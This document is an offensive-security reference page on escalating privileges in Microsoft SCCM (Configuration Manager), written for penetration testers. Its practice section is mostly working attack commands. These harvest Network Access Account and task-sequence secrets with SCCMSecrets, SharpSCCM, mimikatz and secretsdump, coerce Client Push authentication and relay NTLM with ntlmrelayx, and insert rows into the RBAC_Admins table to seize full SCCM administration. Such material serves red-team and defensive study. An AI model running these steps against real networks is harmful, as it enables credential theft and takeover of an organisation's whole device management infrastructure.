---
authors: BlWasp, ShutdownRepo, q-roland
category: ad
---

# Privilege escalation

## Theory

There are currently three different pathways for privilege escalation in an SCCM environment in order to take control over the infrastructure:
* Credential harvesting
* Client Push account authentication coercion
* SCCM site takeover

### Credential harvesting

For more details on this subject, see [this Synacktiv article](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_2).

[This blogpost](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) also contains useful information on the topic.

An SCCM infrastructure may contain a wide range of cleartext credentials accessible from various levels of privileges. Some credentials can be associated with privileged accounts in the domain. From a privilege escalation perspective, we are interested in secrets retrievable using an SCCM client or a low-privilege account in the domain.

1. **Secret policies**: Network Access Accounts (NAAs), Task sequences and Collection variables

Some policies may contain sensitive data and are tagged as **secret policies**. Only registered SCCM devices in the **approved** state may request them. By default in SCCM, two device registration endpoints are available on the Management Point (MP): `http://<MP>/ccm_system/request` and `http://<MP>/ccm_system_windowsauth/request`. The first one is unauthenticated, meaning that anyone can generate a self-signed certificate and register an arbitrary device; however, by default, devices registered through this endpoint are **not** approved, which means that they cannot request secret policies. The second endpoint is authenticated and requires credentials for a domain computer account; devices registered through this endpoint are, by default, **automatically approved**.
> [!TIP] TIP
> This concretely means that an attacker that has a machine account or that is able to relay one can register an approved device and dump secret policies. Also, note that **it is possible for sysadmins to misconfigure SCCM** in order to automatically approve any device registering through the unauthenticated registration endpoint. In that case, an unauthenticated attacker on the network could dump secret policies.

Three kinds of policies are tagged as secret and can contain credentials:
* **Network Access Accounts (NAAs)**: NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. NAA does not need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts. NAA credentials are distributed via secret policies.
* **Task sequences**: Task sequences are automated workflows that can be deployed by administrators on client devices and that will execute a series of steps. [Various task sequence steps](https://www.mwrcybersec.com/an-inside-look-how-to-distribute-credentials-securely-in-sccm) require or give the possibility to the administrator to provide domain credentials in order to execute them. They are distributed via secret policies.
* **Collection variables**: In SCCM, it is possible to associate variables to specific collections of devices. These variables can be used to customize deployments, scripts, or configurations for all members of the collection. They may contain credentials and are distributed via secret policies.

Note that the SCCM Management Point may be hardened and configured to enforce the use of **HTTPS** for client interaction. When this is the case, **client certificate authentication** with a domain PKI client certificate will be required by the Management Point.


2. **Distribution Points resources**

Policies may reference external resources hosted on a **Distribution Point**. These resources may be applications, OS images, but also configuration files, PowerShell scripts, certificates, or other kind of file susceptible to contain sensitive technical information such as credentials.

Distribution Point primarily distributes resources via SMB and HTTP. By default, valid domain credentials must be provided to access hosted resources.
> [!TIP] TIP
> This concretely means that an attacker with any domain account can fetch Distribution Point resources. In addition, **it is possible for sysadmins to misconfigure SCCM Distribution Points** to allow anonymous access to resources. Note that anonymous access only works with the HTTP protocol, and retrieving Distribution Point resources via SMB always requires authentication, even with anonymous access configured.

SCCM Distribution Points may also be configured to enforce the use of **HTTPS**. Again, when this is the case, **client certificate authentication** will be required by the Distribution Point with a domain PKI client certificate.


### Client Push account authentication coercion

If SCCM is deployed via Client Push Accounts, it is possible, from a compromised SCCM client, to coerce the Client Push Account into authenticating to an arbitrary remote resource. It is then possible to retrieve NTLM authentication data in order to crack the account's password or relay the data to other services. Client Push Accounts are privileged as they are required to have local administrator rights on workstations on which they deploy the SCCM client.

### SCCM site takeover

Some SCCM configurations make it possible to abuse the permissions of the site server / passive site server machine accounts in order to compromise the SCCM infrastructure via relay attacks.

1. **Relaying the primary site server**

A site server machine account is required to be member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](index#topology)):
> The user account that installs the site must have the following permissions:
>
> * Administrator on the following servers:
>   * The site server
>   * Each SQL Server that hosts the site database
>   * Each instance of the SMS Provider for the site
>   * Sysadmin on the instance of SQL Server that hosts the site database
>
> _(source:_ [_Microsoft.com_](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites)_)_

As a result, NTLM authentication data can be obtained from an SCCM primary site server and relayed in order to obtain administrative access to the site database, or interact as a local administrator with the HTTP API on the SMS Provider. In both cases, this can lead to the full compromise of the SCCM infrastructure.

2. **Relaying a passive site server**

As described by [Garrett Foster](https://twitter.com/garrfoster) in this [article](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43), when a passive site server is set up for high availability purpose, its machine account must be a member of the local Administrators group on the active site server. It must also be administrator on all the site system deployed in the site, including the MSSQL database. As a result, the same NTLM relaying attacks as described for primary site servers can be exploited in order to compromise the SCCM site database or gain privileged access to the HTTP API of the SMS Provider.



## Practice

### Credential harvesting

As noted in the [Theory section](#theory), secrets can be harvested from SCCM secret policies, or Distribution Point resources.

#### Secret SCCM policies

Only **approved SCCM devices** can fetch secret policies. It is first possible to **register a device ourselves** by providing domain machine account credentials (or exploiting automatic device approval).

::: tabs

=== UNIX-based

To this end, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python) can be used. All secret policies associated with the default collections for the newly registered device (including NAAs, Task sequences and collection variables) will be dumped. This tool also supports HTTPS / client certificate authentication.

```bash
# Plain HTTP
python3 SCCMSecrets.py policies -mp http://$MP_IP -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice'

# HTTPS with client certificate
python3 SCCMSecrets.py policies -mp https://$MP_IP -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' --pki-cert ./cert.pem --pki-key ./key.pem
```

Note that if you do not provide machine account credentials, `SCCMSecrets.py` will use the unauthenticated registration endpoint in order to attempt exploiting automatic device approval.

This attack is also possible via NTLM relay if you are able to relay the authentication data of a domain machine account.
```bash
python3 examples/ntlmrelayx.py -t 'http://mecm.sccm.lab/ccm_system_windowsauth/request' -smb2support --sccm-policies -debug
```

Finally, this attack was first inspired by @xpn_'s work (refer to [this blogpost](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)). The tool associated with the blogpost, [sccmwtf](https://github.com/xpn/sccmwtf) (Python), is available on Github. It can be used to perform the attack, however with two limitations: it will only dump the NAA secret policy, and it might fail on recent SCCM installations since the encryption algorithm changed.

The [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) tool also implements `sccmwtf`, but with the same limitations.
```bash
#Create a new computer account and request the policies
python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto

#To use an already controlled computer account
python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -cn $COMPUTER_NAME -cp $COMPUTER_PASSWORD -dc-ip $DC_IP
```

=== Windows-based

On Windows, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used to register a device and dump secret policies. All secret policies associated with the default collections for the newly registered device (including NAAs, Task sequences and collection variables) will be dumped.

```powershell
.\SharpSCCM.exe get secrets -r newdevice -u $MACHINE_NAME -p $PASSWORD
```

:::

Instead of registering a new device, it is also possible to **use an already compromised SCCM device** in order to dump secret policies. Note that this can also be interesting as the compromised device may be part of specific device collections associated with more task sequences or collection variables than the default collections we dumped by registering a device ourselves.

::: tabs

=== Unix-based

In order to use a compromised SCCM device, it is first necessary to **extract the SCCM certificates** from the machine. More details on how to do this [here](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_4).

With the SCCM device private key and GUID, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python) can be used to impersonate the device and dump secret policies (in the example below, the `compromised_device/` folder contains the `key.pem` and `guid.txt` files).

All secret policies associated with the compromised device's collections (including NAAs, Task sequences and collection variables) will be dumped.

```bash
# Plain HTTP
python3 SCCMSecrets.py policies -mp http://$MP_IP --use-existing-device compromised_device/

# HTTPS with client certificate authentication
python3 SCCMSecrets.py policies -mp http://$MP_IP --use-existing-device compromised_device/ --pki-cert cert.pem --pki-key key.pem
```


=== Windows-based

From a local administrator access on the machine of a compromised SCCM device, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be executed to use the local SCCM device and dump secret policies.

All secret policies associated with the compromised device's collections (including NAAs, Task sequences and collection variables) will be dumped.

```powershell
.\SharpSCCM.exe get secrets
```

:::


Finally, it should be mentioned that SCCM policies secrets (NAA, Task Sequences, Collection variables) are stored on the disk of SCCM clients, encrypted with DPAPI. Interestingly enough regarding NAA, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers (see [this SpecterOps article](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)). The same behaviour can be observed for Task sequences and Collection variables.

As a result, it is possible to retrieve policies secrets **locally** on compromised devices.

::: tabs

=== UNIX-based

Using a local administrator account, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to fetch and decrypt SCCM policies secrets locally, as well as [sccmhunter.py](https://github.com/garrettfoster13/sccmhunter) (Python).

```bash
SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@target.$DOMAIN
```

```bash
python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET -wmi
```

=== Windows-based

With administrative access to a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (C#), [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) or native PowerShell can be used to extract policies secrets locally.

```powershell
# SharpSCCM - from disk
SharpSCCM.exe local secrets disk

# SharpSCCM - from WMI
SharpSCCM.exe local secrets wmi

# SharpDPAPI
SharpDPAPI.exe SCCM

# Mimikatz
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::sccm

# Native Powershell
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
```

:::


#### Distribution Point resources

By default, any authenticated user can retrieve Distribution Point resources which may contain secrets.

Resources can be downloaded through the SMB or HTTP protocols.

As previously mentioned, note that if anonymous access was configured on a Distribution Point, only the HTTP protocol can be used to download files without any credentials.

::: tabs

=== UNIX-based

##### HTTP

Regarding the HTTP protocol on Unix, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python) can be used to index and download files from Distribution Points.

Not providing any credentials will attempt to exploit anonymous access on the Distribution Point. HTTPS and client authentication is also supported by this tool.

```bash
# Attempts to exploit anonymous access to index and download files
python3 SCCMSecrets files -dp http://$DP_IP

# Downloads files with specific extensions 
python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -H '$HASH' --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'

# Having indexed files first, downloads specific files from the Distribution Point
python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -p '$PASSWORD' --urls to_download.lst

# Perform file dump attack via HTTPS and client certificate authentication
python3 SCCMSecrets.py files -dp https://$DP_IP -u '$USER' -p '$PASSWORD' --pki-cert ./cert.pem --pki-key ./key.pem
```

If anonymous access is enabled on the Distribution Point, [sccm-http-looter](https://github.com/badsectorlabs/sccm-http-looter) (Golang) can also be used. It may be faster as it is written in Golang.

```bash
./sccm-http-looter -server 10.10.10.10
```

This attack is also possible via NTLM relay if you are able to relay the authentication data of a domain account. 
```bash
python3 examples/ntlmrelayx.py -t 'http://mecm.sccm.lab/sms_dp_smspkg$/Datalib' -smb2support --sccm-dp -debug
```

##### SMB

Regarding the SMB protocol, [cmloot.py](https://github.com/shelltrail/cmloot) (Python) can be used to dump files.
```bash
# Enumerate SCCM servers, build inventory and download
python3 cmloot.py $DOMAIN/$USER@$TARGET -findsccmservers -target-file sccmhosts.txt -cmlootdownload sccmfiles.txt
```


=== Windows-based

##### SMB

On Windows, [CMLoot](https://github.com/1njected/CMLoot) (Powershell) was the original implementation of the attack in Powershell.

```powershell
# Index available files
Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt

# Download a single file
Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml

# Download all files with a specific extension
Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension ps1
```

:::


### Authentication Coercion via Client Push Installation

> [!TIP]
> In some case, the "Client Push Accounts" could even be part of the Domain Admins group, leading to a complete takeover of the domain.

The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.

#### Option 1: Wait for Client Push Installation

```powershell
# Credential capture using Inveigh 
Inveigh.exe
```

#### Option 2: Forcefully "coerce" the Client Push Installation

> [!WARNING]
> One should read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) before continuing, as this attack might leave traces behind and might mess things up with the SCCM environment.

##### Step 1: prepare coercion listener

Note that you could either capture & crack received credentials or relay them to a suitable target system (or both).

```sh
# On Linux
## Relay using ntlmrelayx.py
ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
```
```powershell
# On Windows
## Credential capture using Inveigh 
Inveigh.exe
```

##### Step 2: trigger Client-Push Installation

```PowerShell
# If admin access over Management Point (MP)
SharpSCCM.exe invoke client-push -t  --as-admin

# If not MP admin
SharpSCCM.exe invoke client-push -t 
```

##### Step 3: cleanup

If you run the above SharpSCCM command with the `--as-admin` parameter (since you have admin privileges over the MP), there's nothing to do. Otherwise, get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t ` parameter. This is the device name that will appear in SCCM.


### SCCM Site Takeover

> [!TIP]
> For more details about how these attacks work, refer to the article "[SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem) for the database attack, and "[Site Takeover via SCCM’s AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)" by [Garrett Foster](https://twitter.com/garrfoster) for the HTTP one.

#### Relay to the MSSQL site database

> [!CAUTION]
> Some requirements are needed to perform the attack:
> 
> * automatic site assignment and automatic site-wide [client push installation](index#client-push-installation-1) are enabled
> * fallback to NTLM authentication is enabled (default)
> * the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) is not installed (it prevents the client push installation account to perform an NTLM connection to a client)
> * PKI certificates are not required for client authentication (default)
> * either:
> 
>   * MSSQL is reachable on the site database server
> 
> OR
> 
>   * SMB is reachable and SMB signing isn’t required on the site database server
>   * knowing the three-character site code for the SCCM site is required (step 3 below)
>   * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
>   * knowing the NetBIOS name, FQDN, or IP address of the site database server is required
> 
> The first four requirements above apply to the [client push installation coercion technique](index#client-push-installation). But without them, a regular coercion technique could still be used (petitpotam, printerbug, etc.).

##### Step 1: retrieve the controlled user SID

The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [#4.-obtain-an-sql-console](index#4.-obtain-an-sql-console).

::: tabs

=== UNIX-like

From UNIX-like systems, the Samba utility named [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can be used for this purpose.

```bash
rpcclient -c "lookupnames USER" $TARGET_IP
```

Impacket's [lookupsid](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) (Python) can also be used to retrieve the user's SID.

```bash
lookupsid.py "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGET_IP_OR_NAME"
```

The returned SID value is in canonical format and not hexadecimal, [impacket](https://github.com/fortra/impacket/blob/34229464dab9ed4e432fdde56d14a916baaac4db/impacket/ldap/ldaptypes.py#L48) can be used to convert it as follows.


```python
from impacket.ldap import ldaptypes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('sid_value')
print('0x' + ''.join('{:02X}'.format(b) for b in sid.getData()))
```



=== Windows

From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used for this purpose.

```
# this should be run on the windows SCCM client as the user (no need for admin privileges here)
SharpSCCM.exe get user-sid
```

:::


##### Step 2: setup NTLM relay server

The target of the [NTLM relay attack](../ntlm/relay) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.

::: tabs

=== UNIX-like

From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose. In the examples below, the `-socks` option is used for more versatility but is not required.

```bash
# targetting MS-SQL
ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks

# targeting SMB
ntlmrelayx.py -t "siteDatabase.domain.local" -smb2support -socks
```


=== Windows

From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same SOCKS functionality, needed in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.

:::


Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../ntlm/relay).

##### Step 3: coerce authentication

The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc.).

::: tabs

=== UNIX-like

From UNIX-like systems, authentication can be coerced through [PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc. (not based on triggering the client push installation).

There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).


=== Windows


```powershell
SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "" -t "attacker.domain.local"
```


:::


The rest of this page is focusing on relaying the authentication on the MS-SQL service.

##### Step 4: Obtain an SQL console

If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) can be used for that purpose.

```bash
proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
```

Once the console is obtained, the attack can proceed to granting the user full privileges by running the following commands in the SQL console.


```
--Switch to site database
use CM_<site_code>

--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<site_code>');

--Retrieve the AdminID of the added user
SELECT AdminID,LogonName FROM RBAC_Admins;

--Add records to the RBAC_ExtendedPermissions table granting the AdminID the Full Administrator (SMS0001R) RoleID for the “All Objects” scope (SMS00ALL), 
--the “All Systems” scope (SMS00001), 
--and the “All Users and User Groups” scope (SMS00004)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1');

```


It is then possible to verify the new privileges on SCCM.


```
# this should be run on the windows SCCM client as the user that was just given full administrative role to 
.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "<site_code>"

```


Post exploitation via SCCM can now be performed on the network.

#### Relay to the HTTP API AdminService

> [!CAUTION]
> Some requirements are needed to perform the attack:
> 
> * The HTTP API for the AdminService service is reachable on the SMS Provider server
> * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
> * knowing the NetBIOS name, FQDN, or IP address of the site SMS provider server is required

##### Step 1: setup an NTLM relay server

The target of the [NTLM relay attack](../ntlm/relay) must be set to the SMS Provider server, on the HTTP/S service (port `80/tcp` or `443/tcp`).

::: tabs

=== UNIX-like

From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.

```bash
ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid 
```

=== Windows

From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.

:::


Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../ntlm/relay).


##### Step 2: Authentication coercion

The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc.).

::: tabs

=== UNIX-like

From UNIX-like systems, authentication can be coerced through [PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc. (not based on triggering the client push installation).

There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).


=== Windows

```powershell
SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "" -t "attacker.domain.local"
```

:::


If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the sms provider server, the controlled should be now a SCCM site admin.

It is then possible to verify the new privileges on SCCM.

```powershell
# this should be run on the windows SCCM client as the user that was just given full administrative role to 
SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc ""
```

#### Relay from a passive site server to the active site server

> [!CAUTION]
> Some requirements are needed to perform the attack:
> 
> * a passive site server is present on the network and its reachable
> * knowing the NetBIOS name, FQDN, or IP address of the passive and active site servers is required
> * SMB signing is not required on the active site server (default)

##### Step 1: setup an NTLM relay server

The target of the [NTLM relay attack](../ntlm/relay) must be set to the active site server, on the SMB service.

::: tabs

=== UNIX-like

From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.

```bash
ntlmrelayx.py -t $ACTIVE_SERVER.$DOMAIN -smb2support -socks
```


=== Windows

From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.

:::


Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../ntlm/relay).

##### Step 2: authentication coercion

The passive site server's authentication can be coerced with ([PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc.).

If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the active server, a SMB session through socks proxy has been opened with administrative rights.

##### Step 3: dump active site server account credentials

Through the socks session, it is possible to dump the local credentials stored in the SAM database, and the secrets from the LSA, with [Impacket](https://github.com/fortra/impacket)'s [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) (Python).

```bash
proxychains4 secretsdump.py $DOMAIN/$PASSIVE_SERVER\$@$ACTIVE_SERVER.$DOMAIN
```

Retrieve the LM:NT hash of the server account.

##### Step 4: add a new SCCM `Full Admin`

Since the active site server must be a member of the SMS Provider administrators (it is member of the `SMS Admins` group), its credentials can be used to add a new controlled user to the `Full Admin` SCCM group. [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.

```bash
sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:NTHASH -ip $SMS_PROVIDER_IP

() (C:\) >> add_admin controlledUser 
() (C:\) >> show_admins
```

Post exploitation via SCCM can now be performed on the network.

> [!CAUTION]
> The tool author ([Chris Thompson](https://mobile.twitter.com/_mayyhem)) warns that [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) is a PoC only tested in lab. One should be careful when running in production environments.

## Resources

[https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/)

[https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)

[https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts](https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts)

[https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)

[https://blog.xpnsec.com/unobfuscating-network-access-accounts/](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)

[https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)

[https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)

[https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)

[https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43)